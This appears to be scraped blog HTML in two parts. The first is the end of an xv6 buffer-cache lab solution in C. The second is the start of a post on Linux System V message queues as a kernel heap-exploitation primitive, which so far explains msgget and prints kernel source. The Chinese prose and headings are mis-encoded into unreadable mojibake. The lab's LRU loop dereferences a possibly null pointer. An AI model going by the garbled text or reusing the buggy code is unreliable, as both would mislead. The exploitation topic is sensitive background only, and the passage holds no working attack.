class="function"><span class="title">bget</span><span class="params">(uint dev, uint blockno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">tmp</span>;</span></span><br><span class="line">  uint32 bid;</span><br><span class="line">  bid=HASH(blockno);</span><br><span class="line">  tmp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// printf(&quot;lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// // Is the block already cached?</span></span><br><span class="line">  <span class="comment">// for(b = bcache.head.next; b != &amp;bcache.head; b = b-&gt;next)&#123;</span></span><br><span class="line">  <span class="comment">//   if(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;</span></span><br><span class="line">  <span class="comment">//     b-&gt;refcnt++;</span></span><br><span class="line">  <span class="comment">//     release(&amp;bcache.lock);</span></span><br><span class="line">  <span class="comment">//     acquiresleep(&amp;b-&gt;lock);</span></span><br><span class="line">  <span class="comment">//     return b;</span></span><br><span class="line">  <span class="comment">//   &#125;</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  <span class="keyword">for</span>(b=bcache.buckets[bid].head.next;b!=&amp;bcache.buckets[bid].head;b=b-&gt;next)&#123;</span><br><span class="line">    <span class="keyword">if</span>(dev==b-&gt;dev&amp;&amp;blockno==b-&gt;blockno)&#123;</span><br><span class="line">      b-&gt;refcnt++;</span><br><span class="line">      acquire(&amp;tickslock);</span><br><span class="line">      b-&gt;timetick = ticks;</span><br><span class="line">      release(&amp;tickslock);</span><br><span class="line">      release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">      <span class="comment">// printf(&quot;acq_sleep:%s\n&quot;,b-&gt;lock.name);</span></span><br><span class="line">      acquiresleep(&amp;b-&gt;lock);</span><br><span class="line">      <span class="comment">// printf(&quot;acq_sleep_end\n&quot;);</span></span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  b=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=bid,cur=<span class="number">0</span>;cur&lt;Bucket_size;i=(i+<span class="number">1</span>)%Bucket_size)&#123;</span><br><span class="line">    cur++;</span><br><span class="line">    <span class="keyword">if</span>(i!=bid)&#123;</span><br><span class="line">      <span class="keyword">if</span>(!holding(&amp;bcache.buckets[i].lock))&#123;</span><br><span class="line">        <span class="comment">// printf(&quot;asd\n&quot;);</span></span><br><span class="line">        <span class="comment">// printf(&quot;for_1_lock_acq:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">        acquire(&amp;bcache.buckets[i].lock);</span><br><span class="line">        <span class="comment">// printf(&quot;for_1_lock_acq_end:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(b=bcache.buckets[i].head.next;b!=&amp;bcache.buckets[i].head;b=b-&gt;next)&#123;</span><br><span class="line">      <span class="keyword">if</span>(b-&gt;refcnt==<span class="number">0</span>&amp;&amp;((b-&gt;timetick&lt;tmp-&gt;timetick)||tmp))&#123;</span><br><span class="line">        tmp=b;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(tmp)&#123;</span><br><span class="line">      <span class="comment">// printf(&quot;tmp:%d,bif:%d\n&quot;,i,bid);</span></span><br><span class="line">      tmp-&gt;next-&gt;prev=tmp-&gt;prev;</span><br><span class="line">      tmp-&gt;prev-&gt;next=tmp-&gt;next;</span><br><span class="line">      release(&amp;bcache.buckets[i].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">      tmp-&gt;next=bcache.buckets[bid].head.next;</span><br><span class="line">      tmp-&gt;prev=&amp;bcache.buckets[bid].head;</span><br><span class="line">      bcache.buckets[bid].head.next-&gt;prev=tmp;</span><br><span class="line">      bcache.buckets[bid].head.next=tmp;</span><br><span class="line">      tmp-&gt;dev = dev;</span><br><span class="line">      tmp-&gt;blockno = blockno;</span><br><span class="line">      tmp-&gt;valid = <span class="number">0</span>;</span><br><span class="line">      tmp-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      acquire(&amp;tickslock);</span><br><span class="line">      tmp-&gt;timetick = ticks;</span><br><span class="line">      release(&amp;tickslock);</span><br><span class="line">      release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">      <span class="comment">// printf(&quot;for_acq_sleep:%s\n&quot;,tmp-&gt;lock.name);</span></span><br><span class="line">      acquiresleep(&amp;tmp-&gt;lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_acq_sleep_end\n&quot;);</span></span><br><span class="line">      <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      release(&amp;bcache.buckets[i].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Not cached.</span></span><br><span class="line">  <span class="comment">// Recycle the least recently used (LRU) unused buffer.</span></span><br><span class="line">  <span class="comment">// for(b = bcache.head.prev; b != &amp;bcache.head; b = b-&gt;prev)&#123;</span></span><br><span class="line">  <span class="comment">//   if(b-&gt;refcnt == 0) &#123;</span></span><br><span class="line">  <span class="comment">//     b-&gt;dev = dev;</span></span><br><span class="line">  <span class="comment">//     b-&gt;blockno = blockno;</span></span><br><span class="line">  <span class="comment">//     b-&gt;valid = 0;</span></span><br><span class="line">  <span class="comment">//     b-&gt;refcnt = 1;</span></span><br><span class="line">  <span class="comment">//     release(&amp;bcache.lock);</span></span><br><span class="line">  <span class="comment">//     acquiresleep(&amp;b-&gt;lock);</span></span><br><span class="line">  <span class="comment">//     return b;</span></span><br><span class="line">  <span class="comment">//   &#125;</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  panic(<span class="string">&quot;bget: no buffers&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a locked buf with the contents of the indicated block.</span></span><br><span class="line"><span class="function">struct buf*</span></span><br><span class="line"><span class="function"><span class="title">bread</span><span class="params">(uint dev, uint blockno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="comment">// printf(&quot;bread-beg\n&quot;);</span></span><br><span class="line">  b = bget(dev, blockno);</span><br><span class="line">  <span class="keyword">if</span>(!b-&gt;valid) &#123;</span><br><span class="line">    virtio_disk_rw(b, <span class="number">0</span>);</span><br><span class="line">    b-&gt;valid = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// printf(&quot;bread-end\n&quot;);</span></span><br><span class="line">  <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write b&#x27;s contents to disk.  Must be locked.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bwrite</span><span class="params">(struct buf *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;bwrite&quot;</span>);</span><br><span class="line">  virtio_disk_rw(b, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Release a locked buffer.</span></span><br><span class="line"><span class="comment">// Move to the head of the most-recently-used list.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">brelse</span><span class="params">(struct buf *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint32 bid;</span><br><span class="line">  <span class="comment">// printf(&quot;brelse-beg\n&quot;);</span></span><br><span class="line">  bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;brelse&quot;</span>);</span><br><span class="line">  <span class="comment">// printf(&quot;re_sleep:%s\n&quot;,b-&gt;lock.name);</span></span><br><span class="line">  releasesleep(&amp;b-&gt;lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// printf(&quot;brelse_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// printf(&quot;brelse-end\n&quot;);</span></span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  acquire(&amp;tickslock);</span><br><span class="line">  b-&gt;timetick = ticks;</span><br><span class="line">  release(&amp;tickslock);</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;brelse_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bpin</span><span class="params">(struct buf *b)</span> </span>&#123;</span><br><span class="line">  uint32 bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="comment">// printf(&quot;bpin_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  b-&gt;refcnt++;</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;bpin_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bunpin</span><span class="params">(struct buf *b)</span> </span>&#123;</span><br><span class="line">  uint32 bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="comment">// printf(&quot;bunpin_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;bunpin_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/17/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97msg%E5%AD%A6%E4%B9%A0-msg%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/17/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97msg%E5%AD%A6%E4%B9%A0-msg%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">æ¶ˆæ¯é˜Ÿåˆ—msgå­¦ä¹ &msgåˆ©ç”¨</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-10-17 01:52:12 / ä¿®æ”¹æ—¶é—´ï¼š01:52:35" itemprop="dateCreated datePublished" datetime="2022-10-17T01:52:12+08:00">2022-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="æ¶ˆæ¯é˜Ÿåˆ—msgå­¦ä¹ -amp-msgåˆ©ç”¨"><a href="#æ¶ˆæ¯é˜Ÿåˆ—msgå­¦ä¹ -amp-msgåˆ©ç”¨" class="headerlink" title="æ¶ˆæ¯é˜Ÿåˆ—msgå­¦ä¹ &amp;msgåˆ©ç”¨"></a>æ¶ˆæ¯é˜Ÿåˆ—msgå­¦ä¹ &amp;msgåˆ©ç”¨</h1><p>ä¹‹å‰è°¢å“¥å‘äº†æˆ‘ä¸¤é“kernelpwnçš„é¢˜ç›®ï¼Œéƒ½æ˜¯æ¯”è¾ƒç®€å•çš„å †æ¼æ´ï¼Œä½†æ˜¯å †çš„sizeä¸å†æ˜¯å¾ˆå¥½åˆ©ç”¨çš„0x20æˆ–è€…0x2e0äº†ï¼Œç„¶åæœäº†æœkernelpwné€šç”¨ç»“æ„ä½“å‘ç°è¿˜æ˜¯æ²¡æœ‰å½“å‰sizeä¸‹å¯ä»¥åˆ©ç”¨çš„å†…æ ¸ç»“æ„ï¼Œç»è¿‡è°¢å“¥æé†’<code>msg</code>å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯çœ‹äº†ä¼š<code>msg</code>å‘ç°è¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„,ç„¶åå°±æ‘†äº†ï¼Œä¸€æ‘†å°±æ‘†åˆ°äº†ç°åœ¨hhï¼Œç—›å®šæ€ç—›ï¼Œå¼€å§‹å­¦ä¹ ã€‚</p>
<h2 id="msgå­¦ä¹ "><a href="#msgå­¦ä¹ " class="headerlink" title="msgå­¦ä¹ "></a>msgå­¦ä¹ </h2><h3 id="åŸºç¡€ä»‹ç»"><a href="#åŸºç¡€ä»‹ç»" class="headerlink" title="åŸºç¡€ä»‹ç»"></a>åŸºç¡€ä»‹ç»</h3><p>æ¶ˆæ¯é˜Ÿåˆ—msgå’Œå…±äº«å†…å­˜ä¸€æ ·æ˜¯linuxæä¾›çš„ä¸€ç§è¿›ç¨‹é—´é€šä¿¡æ–¹å¼(IPC),ä¸€èˆ¬ç§°ä»–ä¸ºIPCå¯¹è±¡ï¼Œåœ¨Linuxä¸­ä½¿ç”¨keyæ¥å”¯ä¸€æ ‡è¯†ï¼Œè€Œä¸”ä»–ä»¬æ˜¯å¯æŒç»­åŒ–ï¼Œå½“è¿›ç¨‹åˆ›å»ºäº†ä¸€ä¸ªIPCå¯¹è±¡ä¹‹åï¼Œè¿™ä¸ªå¯¹è±¡ä¸ä¼šå› ä¸ºè¿›ç¨‹çš„é€€å‡ºè€Œé”€æ¯ï¼Œè€Œæ˜¯ä¸€ç›´å­˜åœ¨ï¼Œç›´åˆ°è°ƒç”¨IPCåˆ é™¤å‡½æ•°æ¥åˆ é™¤ã€‚</p>
<p>æ¶ˆæ¯é˜Ÿåˆ—çš„IPCå¯¹è±¡ï¼Œkeyå’Œidä¹‹é—´çš„å…³ç³»å¦‚ä¸‹å›¾ï¼Œå…¶ä¸­keyæ˜¯å”¯ä¸€çš„ï¼Œå”¯ä¸€ç¡®å®šä¸€ä¸ªIPCå¯¹è±¡ï¼Œä½†æ˜¯æ¯ä¸ªè¿›ç¨‹çš„idæ˜¯å¯ä»¥å˜åŒ–çš„ï¼Œidå°±ç›¸å½“äºæ–‡ä»¶æè¿°ç¬¦ï¼Œkeyå°±ç›¸å½“äºæ–‡ä»¶åï¼ŒIPCå¯¹è±¡ç›¸å½“äºæ–‡ä»¶å†…å®¹ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/20210407233522324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQzODc5Nw==,size_16,color_FFFFFF,t_70" alt="ç³»ç»ŸIPCå¯¹è±¡"></p>
<h3 id="å¸¸ç”¨å‡½æ•°ä»‹ç»"><a href="#å¸¸ç”¨å‡½æ•°ä»‹ç»" class="headerlink" title="å¸¸ç”¨å‡½æ•°ä»‹ç»"></a>å¸¸ç”¨å‡½æ•°ä»‹ç»</h3><h4 id="ftok"><a href="#ftok" class="headerlink" title="ftok()"></a>ftok()</h4><p>äº§ç”Ÿé”®å€¼<code>key_t ftok(const char *pathname, int proj_id);</code></p>
<h4 id="msgget"><a href="#msgget" class="headerlink" title="msgget()"></a>msgget()</h4><p>å¾—åˆ°ipcå¯¹è±¡çš„idå€¼æˆ–è€…åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå½“ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥æ˜¯ftokåˆ›å»ºçš„keyæˆ–è€…<code>IPC_PRIVATE</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°æ§åˆ¶åˆ›å»ºæ¶ˆæ¯é˜Ÿåˆ—çš„æ“ä½œå’Œè¯»å†™æƒé™ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>

<p>ç›¸å…³ç»“æ„ä½“</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>å½“è°ƒç”¨äº†msgget()å‡½æ•°çš„æ—¶å€™ï¼Œå†…æ ¸ä¼šè°ƒç”¨<code>ksys_msgget()</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> <span class="title">msg_ops</span> =</span> &#123;</span><br><span class="line">		.getnew = newque,</span><br><span class="line">		.associate = security_msg_queue_associate,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_params</span> <span class="title">msg_params</span>;</span></span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	msg_params.key = key;</span><br><span class="line">	msg_params.flg = msgflg;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ipcget(ns, &amp;msg_ids(ns), &amp;msg_ops, &amp;msg_params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè°ƒç”¨<code>ipcget</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ipcget</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (params-&gt;key == IPC_PRIVATE)</span><br><span class="line">		<span class="keyword">return</span> ipcget_new(ns, ids, ops, params);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_public(ns, ids, ops, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“key=<code>IPC_PRIVATE</code>çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨<code>ipcget_new()</code>åˆ›å»ºä¸€ä¸ªæ–°çš„æ¶ˆæ¯é˜Ÿåˆ—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ipcget_new</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	down_write(&amp;ids-&gt;rwsem);</span><br><span class="line">	err = ops-&gt;getnew(ns, params);</span><br><span class="line">	up_write(&amp;ids-&gt;rwsem);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨<code>ops-&gt;getnew()</code>,åœ¨<code> ksys_msgget</code>å‡½æ•°ä¸­ï¼Œè¿™ä¸ªå‡½æ•°æŒ‡é’ˆè¢«èµ‹å€¼æˆ<code>newque</code>,ä¹Ÿå°±æ˜¯ä¼šè°ƒç”¨<code>newque</code>å‡½æ•°,è¿™ä¸ªå‡½æ•°ä¸»è¦å°±æ˜¯åˆå§‹åŒ–ç»“æ„ä½“<code>msg_queue</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="msgsnd"><a href="#msgsnd" class="headerlink" title="msgsnd()"></a>msgsnd()</h4><p><code>msgsnd</code>å‡½æ•°ä¼šå‘æŒ‡å®šidå¯¹åº”çš„æ¶ˆæ¯é˜Ÿåˆ—å‘é€æ¶ˆæ¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span>  msqid , <span class="keyword">const</span> <span class="keyword">void</span> * msgp , <span class="keyword">size_t</span>  msgsz , <span class="keyword">int</span>  msgflg )</span></span>;</span><br></pre></td></tr></table></figure>

<p>ç›¸å…³ç»“æ„ä½“</p>
